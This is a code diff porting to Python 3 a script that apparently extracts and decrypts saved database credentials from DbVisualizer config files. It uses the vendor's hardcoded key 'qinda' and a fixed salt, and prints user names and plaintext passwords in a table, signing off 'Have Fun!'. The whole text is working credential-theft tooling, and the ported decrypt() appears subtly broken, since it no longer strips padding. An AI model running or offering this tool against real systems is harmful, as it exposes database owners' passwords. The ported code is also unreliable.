@@ -29,7 +29,7 @@ from lxml import etree, objectify
 from collections import namedtuple
 
 _iterations = 10
-_salt = '\x8E\x129\x9C\aroZ'  # -114, 18, 57, -100, 7, 114, 111, 90
+_salt = b'\x8E\x129\x9C\aroZ'  # -114, 18, 57, -100, 7, 114, 111, 90
 _password = 'qinda'
 Credential = namedtuple('Credential', ['driver', 'name', 'user',
                                        'password', 'connection_info'])
@@ -46,7 +46,7 @@ class PBEWithMD5AndDES(object):
         return DES.new(self.key, DES.MODE_CBC, self.iv)
 
     def _generate_key(self, key, salt, count, length):
-        key = key + salt
+        key = key.encode('utf-8') + salt
         for i in range(count):
             key = md5(key).digest()
         return key[:length]
@@ -58,7 +58,7 @@ class PBEWithMD5AndDES(object):
 
     def decrypt(self, ciphertext):
         plaintext = self._cipher().decrypt(ciphertext)
-        return plaintext[:-ord(plaintext[-1])]
+        return plaintext.decode('utf-8')
 
 
 def decrypt_password(password):
@@ -68,8 +68,7 @@ def decrypt_password(password):
 
 def extract_credentials(config_file):
     with open(config_file, 'r') as xml_file:
-        xml_blob = xml_file.read()
-        root_obj = objectify.fromstring(xml_blob)
+        root_obj = objectify.parse(xml_file).getroot()
     pbe = PBEWithMD5AndDES(_password, _salt, _iterations)
     creds = []
 
@@ -124,22 +123,22 @@ def print_table(rows):
     pattern = " | ".join(formats)
     hpattern = " | ".join(hformats)
     separator = "-+-".join(['-' * n for n in lens])
-    print "   ", hpattern % tuple(headers)
-    print "   ", separator
+    print("   ", hpattern % tuple(headers))
+    print("   ", separator)
     for line in rows:
-        print "   ", pattern % tuple(line)
+        print("   ", pattern % tuple(line))
 
 
 if __name__ == '__main__':
     import sys
     import os.path
     from glob import glob
-    print "[+] DbVisualizer Password Extractor and Decryptor (@gerryeisenhaur)"
+    print("[+] DbVisualizer Password Extractor and Decryptor (@gerryeisenhaur)")
     if len(sys.argv) != 2:
-        print "[-] Usage: %s <dbvis_config_dir>" % (sys.argv[0],)
+        print("[-] Usage: %s <dbvis_config_dir>" % (sys.argv[0],))
         sys.exit(1)
 
     for dbvis_config in glob('%s/*/dbvis.xml' % sys.argv[1]):
-        print "[+] Extracting credentials from %s\n" % (dbvis_config,)
+        print("[+] Extracting credentials from %s\n" % (dbvis_config,))
         print_table(extract_credentials(dbvis_config))
-    print "\n[+] Done. Have Fun!"
+    print("\n[+] Done. Have Fun!")
